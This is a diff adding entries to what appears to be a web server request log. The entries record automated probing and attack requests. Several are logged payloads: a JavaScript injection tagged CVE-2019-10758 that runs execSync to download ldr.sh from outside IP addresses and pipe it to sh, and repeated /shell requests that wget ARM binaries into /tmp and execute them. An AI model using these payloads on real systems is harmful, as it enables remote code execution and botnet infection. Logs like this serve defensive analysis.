@@ -1026,3 +1026,48 @@ GET / -  {}
 POST /checkValid -  {
   document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent curl_cve_2019_10758 http://31.210.20.181/ldr.sh||wget --user-agent wget_cve_2019_10758 -q -O - http://31.210.20.181/ldr.sh)|sh")'
 }
+GET /manager/text/list -  {}
+GET /manager/html -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET /manager/html -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent curl_cve_2019_10758 http://31.210.20.181/ldr.sh||wget --user-agent wget_cve_2019_10758 -q -O - http://31.210.20.181/ldr.sh)|sh")'
+}
+HEAD http://110.242.68.4/ -  {}
+GET / -  {}
+GET / -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET /login -  {}
+GET / -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET http://passport.baidu.com/ -  {}
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/45.14.149.204/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\/45.14.149.204/arm;chmod+777+arm;./arm+jaws -  {}
+GET / -  {}
+GET / -  {}
+GET /manager/html -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent curl_cve_2019_10758 http://31.210.20.181/ldr.sh||wget --user-agent wget_cve_2019_10758 -q -O - http://31.210.20.181/ldr.sh)|sh")'
+}
+HEAD http://110.242.68.4/ -  {}
+GET /manager/html -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent curl_cve_2019_10758 http://194.40.243.98/ldr.sh||wget --user-agent wget_cve_2019_10758 -q -O - http://194.40.243.98/ldr.sh)|sh")'
+}
